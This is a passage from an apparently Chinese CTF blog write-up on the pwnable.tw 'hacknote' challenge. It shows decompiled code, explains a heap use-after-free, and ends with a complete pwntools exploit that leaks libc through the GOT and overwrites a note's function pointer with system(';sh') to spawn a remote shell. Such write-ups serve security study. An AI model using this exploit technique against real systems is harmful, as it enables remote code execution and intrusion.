&#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      all_choice();</span><br><span class="line">      read(0, buf, 4u);</span><br><span class="line">      v0 = atoi(buf);                           // get choice</span><br><span class="line">      if ( v0 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v0 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v0 == 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较经典的形式，这里的重点在三个函数上，我们一起看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebx</span><br><span class="line">  int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf[8]; // [esp+14h] [ebp-14h] BYREF</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( limit &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = malloc(8u);</span><br><span class="line">        if ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = puts_a;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, buf, 8u);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (int)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + 4) = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)*(&amp;ptr + i) + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)*(&amp;ptr + i) + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++limit;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####delete</span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)*(&amp;ptr + v1) + 1));</span><br><span class="line">    free(*(&amp;ptr + v1));</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####print_note</span><br><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">    (*(void (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看可以发现，delete节点后这里没有把指针置为NULL,也没有对note数量进行减操作，delete后的note仍然可以通过print_note来访问，很明显是存在uaf(Use-after-free)漏洞的。<br>我们继续看add的逻辑，发现这个程序在生成一个content节点之前，会先申请一个chunk存放puts的地址和content chunk的地址。那现在，我们已经有大概的思路了，首先由于index chunk的申请大小小于0x10，所以在free之后它会归fastbin管理，fastbin是个单向链表，遵循先进后出原则（最后一个free的chunk会被优先分配）。那么我们就可以先申请两个大于0x20的note,记为note0,note1。index chunk 记为index0,index1。再将他们delete,由于note大于0x20,所以此时我们的fastbin是:index0-&gt;index1,此时我们再去申请一个小于0xf的chunk(add_note),那么这个note的chunk就会从fastbin中取，这个note我们记为<strong>note3: index : index0, content:index1</strong> 此时我们就可以向index1里面写一些函数的地址 ，然后调用了。 知道原理后 ，这就是一个简单的32位ret2libc。<br/><br>###exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">#p=process(&quot;./hacknote&quot;)</span><br><span class="line">p=remote(&quot;chall.pwnable.tw&quot;,10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">def add_note(size,content):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(1))</span><br><span class="line">    p.sendafter(&quot;size :&quot;,str(size))</span><br><span class="line">    p.sendafter(&quot;Content :&quot;,content)</span><br><span class="line">def delete_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(2))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def print_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(3))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def get_out():</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(4))</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;) #note 0</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;)# note 1</span><br><span class="line">delete_note(1) #delete note 1</span><br><span class="line">delete_note(0) #delete note 0</span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">puts=0x804862B</span><br><span class="line">payload=p32(puts)+p32(read_got)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">read_addr=int.from_bytes(p.recv(4),byteorder=&quot;little&quot;)</span><br><span class="line">libc_base=read_addr-libc.sym[&quot;read&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system=libc.sym[&quot;system&quot;]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">payload=p32(system)+b&quot;;sh\0&quot;</span><br><span class="line">#add_note(size=0x20,content=b&quot;aaaa&quot;)</span><br><span class="line">delete_note(2)</span><br><span class="line">#delete_note(3)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如有错误，欢迎各位师傅指正。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
  
</search>
